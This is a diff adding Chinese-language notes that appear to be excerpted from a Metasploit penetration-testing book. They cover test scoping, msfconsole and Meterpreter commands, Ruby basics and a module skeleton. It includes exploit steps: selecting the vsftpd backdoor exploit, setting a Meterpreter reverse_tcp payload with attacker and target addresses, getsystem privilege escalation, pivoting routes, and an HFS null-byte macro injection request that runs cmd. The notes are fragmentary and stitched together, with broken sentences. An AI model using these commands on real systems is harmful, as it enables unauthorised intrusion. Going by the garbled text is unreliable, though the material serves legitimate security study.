@@ -1,0 +1,427 @@
+? 渗透测试的各个阶段
+? Metasploit框架的基本操作
+? 渗透模块的作用
+? 使用Metasploit对目标网络进行渗透测试
+? 使用数据库的优势
+在使用msftidy运行这个模块之前，要先检查一下这些刚刚开发的模块的语法是否正确。为
+此，可以使用Metasploit中名为msftidy的内置工具
+————————————————————————————
+渗透测试执行标准
+（Penetration Testing Execution Standard，PTES）。如果对渗透测试的流程并不了解，可以登录
+http://www.pentest-tandard.org/index.php/PTES_Technical_Guidelines来学习渗透测试和安全分析部
+分的内容。
+渗透测试的范围：这一部分需要确定渗透测试的范围并预估整个项目的工作量。同时要确
+定哪些目标在渗透测试范围内，哪些是不允许进行渗透测试的。测试者要确认渗透区域
+内涉及的IP地址范围和域名范围，以及采用的测试类型（黑盒测试或白盒测试）。比如，
+当进行白盒测试时，会给予测试者哪些权限，是否可以对目标管理人员开展问卷调查，
+在什么时间段可以开展渗透测试，是否能对目标环境进行网络流量压力测试，以及商定本
+次渗透测试的费用以及支付条款。关于渗透范围的常规文档应该包含了如下问题的答案。
+? 目标组织最大的安全问题是什么？
+? 应该对哪些主机、网络地址范围或者应用程序进行测试？
+? 在测试时，应该将哪些主机、网络地址范围或者应用程序排除在测试范围之外？
+? 在测试范围内是否存在第三方系统或者网络？它们拥有了哪些系统（在渗透前是否需
+要获得目标组织的书面许可）？
+? 渗透测试是在现场实地环境中进行还是在虚拟测试环境中进行？
+? 渗透测试是否包括以下测试技术：使用ping对网络范围进行扫描、对目标主机进行端口
+扫描、对目标进行漏洞扫描、对目标进行渗透测试、应用程序级的操作、客户端
+Java/ActiveX逆向功能、物理渗透尝试、社会工程学。
+? 渗透测试是否包括内部网络测试？如果包括的话，如何获取权限？
+? 客户端/终端用户系统是否包含在测试范围内？如果包含的话，将会涉及多少客户？
+? 是否允许使用社会工程学手段？如果允许的话，如何使用？
+? 是否允许使用拒绝服务攻击？
+? 是否可以使用具有破坏性的检查手段和渗透模块？
+? 渗透测试的目标：这一部分要商定本次渗透测试预期达到的主要和次要效果。有关渗透
+目标的常见问题列举如下。
+? 这次渗透测试的商业需求是什么？
+- 出于审计和标准化的目的
+- 积极主动的内部决策以确定所有弱点
+? 目标是什么？
+- 列出目标的各种漏洞
+- 证明各种漏洞的存在
+- 测试各种事件响应
+- 对网络、系统或者应用程序漏洞的渗透模块开发
+- 以上全部
+? 渗透测试用到的术语和定义：这一部分要向客户介绍整个测试过程中出现的专业术语和
+定义，以便客户能够更好地理解整个渗透测试工作。
+? 渗透测试的规定：这一部分要商定完成渗透测试的工期，具体工作展开的进度表，渗透
+攻击的授权许可，以及定期召开会议以跟进渗透测试进程中出现的各种情况。有关约定
+规则的常见问题列举如下。
+? 希望在什么时候执行这些测试？
+- 在工作时间
+- 下班之后
+- 在周末
+- 在系统维护期间
+? 这个测试是在生产环境下进行的吗？
+? 如果生产环境不能受到影响，是否存在类似的环境（开发或者测试系统）可以用来进
+行渗透测试？
+? 谁是技术要点的联系人？
+
+
+渗透模块（exploit）：这是一段程序，运行时会利用目标的安全漏洞进行攻击。
+? 攻击载荷模块（payload）：在成功对目标完成一次渗透之后，这段程序开始在目标计算
+机上运行。它能帮助我们在目标系统上获得需要的访问和行动权限。
+? 辅助模块（auxiliary）：包含了一系列的辅助支持模块，包括扫描模块、fuzz测试漏洞发
+掘模块、网络协议欺骗以及其他一些模块。
+? 编码器模块（encoder）：编码器模块通常用来对我们的攻击模块进行代码混淆，来逃过
+目标安全保护机制的检测。目标安全保护机制包括杀毒软件和防火墙等。
+? Meterpreter：Meterpreter是一种使用内存技术的攻击载荷，可以注入到进程之中。它提供
+了各种可以在目标上执行的功能，从而成为了最受欢迎的攻击载荷。
+
+use [Auxiliary/Exploit/
+Payload/Encoder]
+选择一个指定的模块并使其开始
+工作
+msf>use exploit/unix/ftp/vsftpd_234_backdoor
+msf>use auxiliary/scanner/portscan/tcp
+
+show [exploits/payloads/
+encoder/auxiliary/options]
+显示可用的特定功能的模块 
+msf>show payloads
+msf> show options
+
+set [options/payload] 
+给某个特定对象赋值 
+msf>set payload windows/meterpreter/reverse_tcp
+msf>set LHOST 192.168.10.118
+msf> set RHOST 192.168.10.112
+msf> set LPORT 4444
+msf> set RPORT 8080
+
+
+setg [options/payload] 
+给某个对象赋值的同时设定作用
+域为全局，在模块进行切换的时
+候，该对象的值不会被改变
+msf>setg RHOST 192.168.10.112
+
+
+
+Run 
+在设置一个辅助模块需要的所有
+选项之后，启动该辅助模块
+msf>run
+
+exploit
+ 启动一个渗透模块
+ msf>exploit
+
+back 
+取消当前选择的模块并且退回到
+上一级命令窗口
+msf(ms08_067_netapi)>back
+
+msf>Info 
+列出相关模块的信息 
+msf>info exploit/windows/smb/ms08_067_netapi
+msf(ms08_067_netapi)>info
+
+Search 
+搜索符合条件的特定模块
+ msf>search hfs
+
+check 
+检查某个特定目标是否易受攻击
+msf>check
+
+Sessions
+ 列出当前可用的会话
+ msf>sessions [session number]
+
+——————————————————————————————
+以下是Meterpreter的一些命令。
+Meterpreter 命令 用 途 示 例
+
+sysinfo
+ 列出被渗透主机的系统信息
+ meterpreter>sysinfo
+
+ifconfig
+ 列出被渗透主机的网络接口
+ meterpreter>ifconfig
+meterpreter>ipconfig (Windows)
+Arp 列出目标主机ARP缓存地址的IP
+地址和MAC 地址
+meterpreter>arp
+
+background
+ 将一个处于激活状态的会话发送
+到后台
+meterpreter>background
+
+shell 获取目标主机的一个cmd
+ shell meterpreter>shell
+
+getuid 获取当前用户细节
+ meterpreter>getuid
+
+getsystem
+ 提升权限，获取系统级权限
+ meterpreter>getsystem
+
+getpid
+ 获取Meterpreter 会话在目标主机
+上注入进程的进程号
+meterpreter>getpid
+
+ps
+ 列出目标主机上运行的所有进程meterpreter>ps
+
+————————————————————————————————
+http://www.offensive-security.com/metasploitunleashed/
+Msfconsole_Commands
+
+子网（subnet）和无类别域际路由（Classless Inter Domain Routing，
+CIDR），Metasploit就可以自动对所有计算机进行测试以发现目标上的漏洞
+
+
+Metasploit可以在目标计算机上不留痕迹地建立控制通道，而一个自定义编码的渗透模块在
+建立控制通道时却可能会引起系统的崩溃
+
+Metasploit提供了一个漂亮的图形化管理界面，另外也对第三方图形化管理软件（例如
+Armitage）提供了管理界面。这些界面极大地简化了渗透测试的工作，例如易于切换的工作平台、
+漏洞管理、单击鼠标即可完成的渗透功能。本书的后面几章将详细讨论这些环境。
+
+
+。由NMAP生成的报告可以轻松地导入
+到Metasploit中。Metasploit内置了数据库功能，利用这个功能我们就能在Metasploit中执行NMAP
+扫描，并将扫描结果存储在数据库中。
+
+有关NMAP扫描的更多信息，请访问http://nmap.org/bennieston-tutorial/。
+推荐一本关于NMAP的极为优秀的图书：http://www.packtpub.com/networkingand-
+servers/nmap-6-network-exploration-and-security-auditing-cookbook。
+
+称。
+来看看其他核心数据库操作命令是如何工作的。下表有助于了解这些数据库命令。
+命 令 用 途
+db_connect 用来与默认数据库之外的数据库交互
+db_export 用来将数据库中保存的数据导出，用来生成测试报告或者用来导入到其他安全工具中
+db_nmap 用来使用NMAP软件对目标进行扫描，并将结果保存到Metasploit的数据库中
+db_status 用来检查是否建立了与数据库的连接
+db_disconnect 用来从指定的数据库中断开
+db_import 用来向数据库中导入来自其他扫描工具（例如Nessus、NMAP等）的扫描结果
+db_rebuild_cache 用来重新建立缓存，主要目的是使用新的配置替代之前缓存文件中错误或者过时的配置
+我们已经在Metasploit中找到了对应服务漏洞的渗透模块，之后的渗透细节可以查看
+http://www.securityfocus.com/bid/48539/discuss 和http://scarybeastsecurity.blogspot.in/211/7/alert-vsft
+pd-download-backdoored.html
+关渗透模块的更多信息，请访问https://www.rapid7.com/db/modules/exploit/
+unix/ftp/vsftpd_234_backdoor/。
+msfpopen
+——————————————————————————————————————————————————————————————————
+现在向目标主机添加一个到内部网络的路由项，添加命令为autoroute -s
+192.168.20.0 255.255.255.0
+function findMacroMarker(s:string; ofs:integer=1):integer；
+begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end；
+这个函数不能正确地处理空字节，所以当我们对http://localhost:80/search=%00{ .exec|cmd.}
+发起请求时，就会停止对宏的正则解析，从而导致远程代码注入。了解在Metasploit环境中进行Ruby编程的基础知识。
+? 研究Metasploit的模块。
+? 编写自定义的扫描模块、暴力破解模块和后渗透模块。
+? 编写Meterpreter脚本。
+? 理解Metasploit模块的语法和语义。
+
+----可以构建自动化类来重用代码是Ruby语言的一个特点，而这个特点正好满足了Metasploit
+的需求。
+? Ruby是一种面向对象的编程语言。
+? Ruby是一种解释型语言，执行速度快，项目开发周期短。
+
+日本的松本行弘在1995年设计并实现了Ruby语言。①
+后来它被进一步定义为功能类似于Perl语言的、具有动态特性和反射机制的、通用的面向对象
+（Object-Oriented Programming，OOP）的程序设计语言。
+http://tryruby.org/levels/1/challenges/
+? 通过RailGun使用DLL完成十分困难的任务。
+ Windows 2000 机器 msfpescan 使用提供的地址 在下面的示例中，我们可以看到此漏洞利用需要 pop/pop/ret。 
+
+命令行解释执行Ruby语言
+>>1
+1
+变量a =""
+方法def method_name [(argc[=default],....[,*argc[,&expr]])]
+	expr
+       end
+
+
+
+Ruby语言提供了puts和print这两种输
+出打印函数。当涉及Metasploit框架时，将使用print_line函数。我们可以分别使用print_good、
+print_status和print_error语句来表示成功执行、状态和错误
+
+当你在Metasploit模块下运行这些命令时会产生如下输出，+符号并绿色显示表示正常，*符
+号并蓝色显示表示状态信息，-符号并红色显示表示错误信息。
+
+
+
+另外，当需要在一个变量
+后面追加数据的时候，也可以使用<<运算符：
+
+子字符串（substring）函数
+在Ruby中可以轻松地使用substring函数来获取子字符串——只需要指明子字符串在字符
+串中的起始位置和长度
+
+，可以用to_i函数将字符串类
+型的输入转换成数字。另一方面，也可以使用to_s函数将一个数字转换成字符串。
+
+3）split函数
+	可以使用split函数将一个字符串类型的值分割为一个变量数组。
+		
+	目前方法使用越来越少了,除非是与硬件有关的应用。
+	Ruby中的数制转换
+	在使用渗透模块和其他模块时，都将使用到各种转换机制。现在来看一些之后会用到的数制
+	转换。
+? 	16进制到10进制的转换
+	在Ruby中使用hex函数对一个数值进行从16进制到10进制的转换是十分简单的，下面给出
+	了一个示例：
+	irb(main):021:0> a= "10"
+	=> "10"
+	irb(main):022:0> a.hex
+	=> 16
+	可以看出，16进制下的10对应10进制下的16。
+	? 10进制到16进制的转换
+	和上例中相反的操作可以使用to_s函数来实现：
+	irb(main):028:0> 16.to_s(16)
+	=> "10"
+	Ruby中的范围
+	范围（range）是一个很重要的内容，广泛应用在Metasploit的辅助模块中，例如扫描模块和
+	测试模块。
+	让我们定义一个范围，并且查看一下可以对这种数据类型进行哪些操作：
+	irb(main):028:0> zero_to_nine= 0..9
+	=> 0..9
+	irb(main):031:0> zero_to_nine.include?(4)
+	=> true
+	irb(main):032:0> zero_to_nine.include?(11)
+	=> false
+	irb(main):002:0> zero_to_nine.each{|zero_to_nine| print(zero_to_nine)}
+	0123456789=> 0..9
+	irb(main):003:0> zero_to_nine.min
+	=> 0
+	irb(main):004:0> zero_to_nine.max
+	=> 9
+	我们可以看到一个范围对象提供的多种操作，例如搜索、查找最小值和最大值和显示范围中
+	的所有数据。这里的include?函数可以检查范围中是否包含某一个特定的值。此外，min和max
+	函数可以显示出范围中的最小值和最大值。
+
+这是因为按照决策运算符=~的计算，这两个值是匹配
+函数find_match()，这个函数的作用是检查该变量是否可以匹配正则表达式
+/Metasploit/。如
+迭代循环是通过each实现的。这是一种十分常见的做法，在Metasploit模块中被广泛使用。
+下面是一个示例：
+def each_example(a)
+a.each do |i|
+print i.to_s + "\t"
+end
+end
+# 主函数从这里开始
+a = Array.new(5)
+a=[10,20,30,40,50]
+each_example(a)
+在上面的代码中，我们定义了一个方法，这个方法接收一个数组a，然后将数组a中的所有元
+素用each循环打印出来。使用each方法完成循环会将数组a中的元素临时保存到i中，一直到下
+一个循环时再重写这个变量的值。输出语句中的\t表示一个制表位（tab）。
+关Ruby中的正则表达式的更多信息，请访问http://www.tutorialspoint.com/
+Ruby/Ruby_regular_expressions.htm。
+下方的链接提供了Ruby编程语言速查卡，可以让你的编程更高效：https://
+github.com/savini/cheatsheets/raw/master/Ruby/RubyCheat.pdf、http://hyperpolyglot.
+org/scripting。
+有关如何构建正确的正则表达式的更多信息，请访问http://rubular.com/。
+
+
+一个丰富的Ruby语言教程资源库：http://tutorialspoint.com/Ruby/。
+? 可以帮助你提高Ruby语言编程效率的速查表的链接。
+? https://github.com/savini/cheatsheets/raw/master/Ruby/RubyCheat.pdf。
+? http://hyperpolyglot.org/scripting。
+? 有关Ruby的更多信息，请访问http://en.wikibooks.org/wiki/Ruby_Programming。
+
+Metasploit拥有大量的攻击载荷模块、编码器模块、
+渗透模块、空指令模块、辅助模块。这一节将学习模块开发的要点。我们来了解一下如何在实际
+中创建自己的自定义模块。
+本节将就辅助模块和后渗透模块的开发展开讨论
+
+基础库文件名称 用 途
+Ruby扩展（REX） 处理几乎所有的核心功能，如设置网络套接字、网络的连接、格式化和所有其他基本功能
+MSF核心 提供了基本的API和框架的实际核心
+MSF基础 对模块提供了友好的API
+
+
+模块类型 功 能
+攻击载荷模块 这类模块通常用来在成功渗透目标以后建立从本机发起到目标、从目标发起到本机的连接，或者执
+行特定的任务，例如在目标机上安装一个服务，等等。攻击载荷模块是在成功渗透了目标计算机以
+后的下一个步骤。前一章中广泛使用的Meterpreter就是一个常见的Metasploit攻击载荷模块
+辅助模块 辅助模块是一种用来执行指定任务的特殊模块，例如信息收集、数据库特征识别、目标网络扫描以
+实现对服务的查找和列举等
+编码器模块 这些模块用来对攻击向量和攻击载荷进行加密，借此躲避防病毒软件和防火墙的检测
+NOP 实现指令的对齐，提高渗透程序的稳定性
+渗透模块 触发一个系统漏洞的实际代码
+
+
+
+
+目 录 用 途
+lib Metasploit的核心和灵魂，包含了帮助我们建立MSF模块的全部重要库文件
+modules 包含Metasploit中的所有模块——从扫描模块到后渗透模块，每一个Metasploit中集成的模
+块都可以在这个目录中找到
+tools 包含了用于辅助渗透测试的命令行程序。从创造无用数据到查找JMP ESP地址的工具都
+可以在这里找到，所有有用的命令行程序都包含于此
+plugins 包含了所有用于扩展Metasploit功能的插件，例如OpenVAS、Nexpose、Nessus以及其他
+各种可以使用load命令载入的工具
+scripts 包含了Meterpreter和其他各种脚本
+
+
+
+对于我们很重要的REX库文件位于/lib目录下。在/lib下还包含了各种服务的
+重要目录。
+另外两个重要的库/base和/core位于/msf目录下
+
+一些Metasploit模块广泛使用的库文件均位于core/exploits/
+
+
+core/目录下找到支持各种类型模块的所有相关库文件。目前，这里可以找到渗透模
+块、攻击载荷模块、后渗透模块、编码器模块以及各种其他模块的core库。
+
+Metasploit模块的格式
+Metasploit模块的骨骼框架比较简单，下面的代码就给出了一个通用的框架头部：
+
+
+require 'msf/core' //导入了msf/core库。
+class MetasploitModule < Msf::Auxiliary//定义了类的用途为MSF::Auxiliary
+	def initialize(info = {})//initialize方法是Ruby编程语言中的默认构造方法。在这个方法中，我们定义了名称
+				（Name）、描述（Description）、作者（Author）、许可（Licensing）和CVE信息等。这个方
+				法涵盖了特定模块的所有相关信息：软件的名称通常会体现设计软件的目的；描述中会包含对漏
+					洞的摘要说明；作者是开发这个模块的人的名字；许可就是MSF_LICENSE.
+		super(update_info(info,
+		'Name' => 'Module name',
+		'Description' => %q{
+		Say something that the user might want to know.
+		},
+		'Author' => [ 'Name' ],
+		'License' => MSF_LICENSE
+		))
+	end
+	def run
+	# Main function
+	end
+end
+
+Msf::Exploit::Remote::HttpClient /lib/msf/core/exploit/http/client.rb 这个库文件提供了大量方法，例如
+连接到目标计算机、发送请求、切
+断与客户端的连接等
+Msf::Auxiliary::WmapScanServer /lib/msf/core/auxiliary/wmapmodule.rb 你可能在想， 什么是WMAP ？
+WMAP是一款基于Metasploit的通用
+Web应用程序扫描框架，有助于完成
+Metasploit的Web渗透测试
+Msf::Auxiliary::Scanner /lib/msf/core/auxiliary/scanner.rb 这个文件包含了基于扫描模块的所
+有函数，提供了模块运行、模块初
+始化、扫描进度等各种方法
+
+
+def run_host(ip)
+begin
+connect
+res = send_request_raw({'uri' => '/', 'method' => 'GET' })
+return if not res
+fp = http_fingerprint(:response => res)
+print_status("#{ip}:#{rport} #{fp}") if fp
+rescue ::Timeout::Error, ::Errno::EPIPE
+end
+end
+end
+
+
